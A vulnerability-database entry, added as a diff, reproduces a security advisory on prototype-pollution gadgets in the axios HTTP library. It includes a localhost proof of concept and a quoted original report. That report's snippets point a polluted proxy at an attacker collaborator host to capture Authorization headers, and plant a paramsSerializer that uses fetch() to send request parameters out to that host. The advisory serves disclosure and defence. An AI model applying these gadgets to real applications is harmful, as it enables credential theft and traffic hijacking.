@@ -1,0 +1,159 @@
+[basic]
+description = '''
+## Summary
+
+axios is vulnerable to read-side prototype-pollution gadgets when `Object.prototype` has already been polluted by another vulnerability or dependency. The most broadly reachable issue is in the bodyless method aliases: `axios.get()`, `axios.delete()`, `axios.head()`, and `axios.options()` read inherited `data` before config normalization, causing attacker-controlled body data to be sent on requests that did not explicitly set a body.
+
+Additional low-level paths affect consumers that call exported adapters/helpers directly with plain config objects. In those cases, inherited `proxy` or `paramsSerializer` values can influence request routing or URL serialization. These low-level paths are not reproduced through normal `axios.get()` usage on `1.15.2+`.
+
+## Impact
+
+An attacker who can first pollute `Object.prototype` can cause axios to send attacker-controlled request bodies on bodyless method aliases. This can corrupt request semantics where the receiving service processes bodies on `GET`, `DELETE`, `HEAD`, or `OPTIONS`.
+
+For direct low-level Node HTTP adapter usage, inherited `proxy` can route requests through an attacker-controlled proxy. Depending on axios version, target scheme, and proxy behavior, this can expose request URLs, headers, and bodies or allow traffic modification.
+
+For direct `resolveConfig` or browser-adapter helper usage, inherited `paramsSerializer` can be invoked with request params, allowing attacker-controlled URL serialization. This was not reproduced through normal high-level axios calls on `1.15.2+`.
+
+## Affected Functionality
+
+Affected normal API:
+
+- `axios.get(url[, config])`
+- `axios.delete(url[, config])`
+- `axios.head(url[, config])`
+- `axios.options(url[, config])`
+
+Affected low-level usage:
+
+- Direct calls to `axios/lib/adapters/http.js` or `axios/unsafe/adapters/http.js` with plain configs and no own `proxy`.
+- Direct calls to `axios/unsafe/helpers/resolveConfig.js` or direct browser adapter/helper paths with plain configs and no own `paramsSerializer`.
+
+Unaffected or corrected scope:
+
+- Normal `axios.get()` calls on `1.15.2+` did not reproduce the `proxy` or `paramsSerializer` gadgets because `mergeConfig()` returns a null-prototype config and uses own-property reads.
+
+## Technical Details
+
+`lib/core/Axios.js` constructs aliases for bodyless methods and copies `data` with `(config || {}).data` before config normalization. If `Object.prototype.data` is polluted, this inherited value becomes an own `data` property in the merged request config and is sent by the adapter.
+
+`lib/core/mergeConfig.js` in `1.15.2+` returns a null-prototype config and uses `hasOwnProp` guards, which prevents normal high-level requests from inheriting polluted `proxy` and `paramsSerializer` values after merge. This is why those two reporter claims do not reproduce through normal `axios.get()` on `1.15.2` or `1.16.1`.
+
+The low-level adapter/helper paths can still receive plain configs directly. In that usage, direct reads of `config.proxy` in the Node HTTP adapter and `config.paramsSerializer` in affected `resolveConfig()` versions can consume inherited polluted values.
+
+## Proof of Concept of Attack
+
+```js
+import http from 'http';
+import axios from 'axios';
+
+const server = http.createServer((req, res) => {
+  let body = '';
+
+  req.on('data', chunk => {
+    body += chunk;
+  });
+
+  req.on('end', () => {
+    res.writeHead(200, {'content-type': 'application/json'});
+    res.end(JSON.stringify({body, headers: req.headers}));
+  });
+});
+
+await new Promise(resolve => server.listen(0, '127.0.0.1', resolve));
+
+Object.prototype.data = 'INJECTED';
+
+try {
+  const res = await axios.get(`http://127.0.0.1:${server.address().port}/data`);
+
+  console.log(res.data.body); // \"INJECTED\"
+  console.log(res.data.headers['content-length']); // \"8\"
+} finally {
+  delete Object.prototype.data;
+  await new Promise(resolve => server.close(resolve));
+}
+```
+
+Expected result: a request body is sent even though the caller did not explicitly set `config.data`.
+
+## Workarounds
+
+Avoid processing untrusted input with libraries or code paths that can pollute `Object.prototype`. As a defense-in-depth mitigation before an axios fix is available, explicitly pass `data: undefined` on bodyless method aliases when running in a process where prototype pollution is a concern.
+
+<details>
+<summary>Original Report</summary>
+
+### Summary
+
+Three prototype pollution read-side gadgets in axios bypass the `own()` hasOwnProp guard pattern, allowing a polluted `Object.prototype` to hijack outbound requests.
+
+### Details
+
+The [`own()` helper](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L342) was introduced after GHSA-q8qp-cvcw-x6jj to prevent polluted prototype properties from reaching security-sensitive config reads. Three paths were missed:
+
+`config.proxy` at [http.js:715](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L715) goes straight into [`setProxy()`](https://github.com/axios/axios/blob/v1.15.2/lib/adapters/http.js#L197). A polluted `Object.prototype.proxy` reroutes outbound requests through an attacker-controlled proxy, exposing Authorization headers and full request URLs.
+
+`(config || {}).data` at [Axios.js:248](https://github.com/axios/axios/blob/v1.15.2/lib/core/Axios.js#L248) covers GET, HEAD, DELETE, OPTIONS. Even without explicit body, polluted value becomes the body. I got injected payloads on 3 of 4 method types in testing.
+
+`config.paramsSerializer` at [resolveConfig.js:32](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L32) is three lines below the [`own()` definition that was supposed to protect it](https://github.com/axios/axios/blob/v1.15.2/lib/helpers/resolveConfig.js#L15). A polluted  function onto `Object.prototype.paramsSerializer` gets called with the request params on every request that has query strings.
+
+I read up on the threat model and I believe T-R4b identifies this exact class and notes that config-read paths must use `hasOwnProp` guards. These three seem to predate or were missed by that coverage.
+
+### PoC
+
+Ran against `axios@1.15.2` on `node:22-slim` in Docker. Clean install, no other deps.
+
+```javascript
+import axios from 'axios';
+
+// gadget 1 - proxy
+Object.prototype.proxy = { host: 'yourcollab.oastify.com', port: 8080, protocol: 'http' };
+await axios.get('https://api.example.com/user', { headers: { Authorization: 'Bearer sk-test-1234567890' } });
+// check collaborator - request arrives with full path + auth header
+```
+
+```javascript
+// gadget 2 - data on bodyless methods
+Object.prototype.data = '{\"injected\":true}';
+await axios.get('https://api.example.com/items');
+await axios.delete('https://api.example.com/items/1');
+await axios.head('https://api.example.com/items');
+// 3/4 methods send the polluted body
+```
+
+```javascript
+// gadget 3 - paramsSerializer
+Object.prototype.paramsSerializer = (p) => {
+  fetch('https://yourcollab.oastify.com/?' + new URLSearchParams(p));
+  return 'q=x';
+};
+await axios.get('https://api.example.com/search', { params: { token: 'secret' } });
+```
+
+### Impact
+
+Any app with a polluted prototype (common via transitive deps like lodash, qs, minimist) should be affected. Gadget 1 steals credentials and redirects traffic. Gadget 2 corrupts request semantics. Gadget 3 gives the attacker arbitrary control over URL construction and a data exfiltration channel. All three fire silently on normal application code that never touches proxy, data, or `paramsSerializer` directly.
+</details>
+'''
+published = ""
+remediation = "请参考官方安全公告，及时安装安全更新或升级到最新版本。"
+score = 5
+severity = "MEDIUM"
+sources = ["ghsa"]
+title = "Axios: Prototype pollution gadgets can alter axios request construction"
+updated = ""
+
+[exploit]
+exp_urls = []
+poc_urls = []
+
+[id]
+aliases = ["GHSA-mmx7-hfxf-jppx"]
+ave_id = "AVE-2026-1150"
+
+[meta]
+collected_at = "2026-08-06T07:44:29.400533913+00:00"
+status = "completed"
+
+[references]
+urls = []
